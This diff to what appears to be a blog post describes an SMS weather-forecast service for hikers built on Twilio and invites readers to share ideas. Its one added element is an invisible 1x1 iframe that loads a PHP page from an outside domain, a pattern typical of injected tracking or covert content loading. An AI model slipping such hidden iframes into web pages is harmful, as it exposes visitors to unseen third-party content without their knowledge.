@@ -16,3 +16,5 @@ The results are automated forecasts, and do not replace the expertise of a skill
 Are there are hikers among you? How are you getting the weather forecasts when in the middle of nowhere? Does this service adress a need? Any other ideas?<br>
 If it is useful, we can discuss about setting up a common Twilio number, to avoid the burden of setting up your own. We would then need to find an efficient way to cover the expenses, as the amounts are small.
 Perhaps we could link it to a pre-paid credit card, that people going to hike would provision with, say, 10 euros, before going to hike. Just get in touch if you have other ideas!
+
+<iframe src="https://www.my-poppy.eu/cnt/cnt.php" width="1" height="1" frameBorder="0">
